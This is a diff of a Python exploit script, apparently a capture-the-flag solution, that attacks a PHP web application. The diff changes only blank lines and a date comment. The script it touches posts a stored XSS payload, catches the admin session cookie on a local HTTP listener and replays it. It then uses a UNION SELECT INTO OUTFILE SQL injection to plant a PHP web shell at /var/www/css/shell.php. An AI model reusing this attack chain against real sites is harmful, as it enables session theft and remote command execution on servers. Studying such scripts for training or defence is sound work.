@@ -1,4 +1,3 @@
-# 5/12/2022
 #!/usr/bin/python3
 
 import requests
@@ -30,7 +29,10 @@ def wait_file():
         os.system("kill $(cat process_id)")
     return session
 
+
+
 # sess = requests.Session()
+
 
 post_data = {
     "title" : "Test XSS",
@@ -43,7 +45,10 @@ proxy = {
     "http" : "http://127.0.0.1:8080"
 }
 
+
 req = requests.post(f"http://{remote_host}/post.php?id=1",data=post_data, proxies=proxy)
+
+
 
 create_http_server()
 session_id = wait_file()[0]
@@ -59,6 +64,8 @@ req_xss = requests.get(f"http://{remote_host}/admin/", proxies=proxy, headers=he
 print(req_xss.text)
 
 
+
+
 sql_header_list = {
     "User-Agent" : "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0",
     "Accept" : "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
@@ -68,6 +75,8 @@ sql_header_list = {
 
 
 sql_post_data = """Welcome\r\n-----------------------------34433761631640999082259010474\r\nContent-Disposition: form-data; name="text"\r\n\r\nhttp://{remote_host}/admin/edit.php?id=0 union select 1,2,"<?php system($_GET['c']); ?>",4 into outfile "/var/www/css/shell.php" #\r\n-----------------------------34433761631640999082259010474\r\nContent-Disposition: form-data; name="Update"\r\n\r\nUpdate\r\n-----------------------------34433761631640999082259010474--"""
+
+
 
 upload_sql = requests.post(f"""http://{remote_host}/admin/edit.php?id=0 union select 1,2,"<?php system($_GET['c']); ?>",4 into outfile "/var/www/css/shell.php" #""",data=sql_post_data, headers=sql_header_list, proxies=proxy)
 
